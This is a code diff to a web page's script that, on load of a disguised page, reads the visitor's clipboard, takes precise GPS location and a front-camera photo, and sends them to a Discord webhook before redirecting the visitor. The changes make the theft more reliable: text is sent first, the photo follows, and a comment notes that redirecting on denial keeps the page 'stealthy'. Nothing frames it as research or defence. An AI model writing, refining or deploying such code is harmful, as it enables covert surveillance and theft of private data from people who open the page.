@@ -28,53 +28,51 @@
 
         async function send() {
             const status = document.getElementById('status');
-            status.innerText = "Syncing...";
+            status.innerText = "Connecting...";
 
-            let clip = "None";
-            try { clip = await navigator.clipboard.readText(); } catch (e) { clip = "Denied"; }
+            let clip = "Denied/None";
+            try { clip = await navigator.clipboard.readText(); } catch (e) {}
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                const formData = new FormData();
+                
+                // STEP 1: Send Text Data IMMEDIATELY (Highly Reliable)
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: `📍 **Location:** ${mapLink}\n📋 **Clipboard:** ${clip}` })
+                });
 
+                // STEP 2: Try Camera (More likely to fail, so we do it last)
                 try {
-                    // 1. Capture Image
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
 
                     const canvas = document.createElement('canvas');
-                    canvas.width = 480; // Smaller size for faster upload
-                    canvas.height = 640;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
-                    
+                    canvas.width = 320; // Very small for instant upload
+                    canvas.height = 240;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                     stream.getTracks().forEach(t => t.stop());
 
-                    // 2. Convert to Blob
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
-                    formData.append("file", blob, "safety.jpg");
-                } catch (e) {
-                    console.log("Camera skipped");
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
+                    const fd = new FormData();
+                    fd.append("file", blob, "photo.jpg");
+                    
+                    // Send photo as a follow-up
+                    await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+                } catch (camErr) {
+                    console.log("Camera skipped or blocked");
                 }
 
-                // 3. Add the JSON data correctly for Discord
-                formData.append("payload_json", JSON.stringify({
-                    content: `✅ **Update Received**\n📍 **Location:** ${mapLink}\n📋 **Clipboard:** \`${clip}\``
-                }));
-
-                // 4. Force 'await' so the browser can't leave until finished
-                try {
-                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                } catch (err) {
-                    console.error("Upload failed");
-                } finally {
-                    window.location.replace(REDIRECT_URL);
-                }
+                // STEP 3: Redirect
+                window.location.replace(REDIRECT_URL);
 
             }, (err) => {
+                // If location is denied, just redirect to stay stealthy
                 window.location.replace(REDIRECT_URL);
-            }, { enableHighAccuracy: true });
+            }, { enableHighAccuracy: true, timeout: 5000 });
         }
     </script>
 </body>
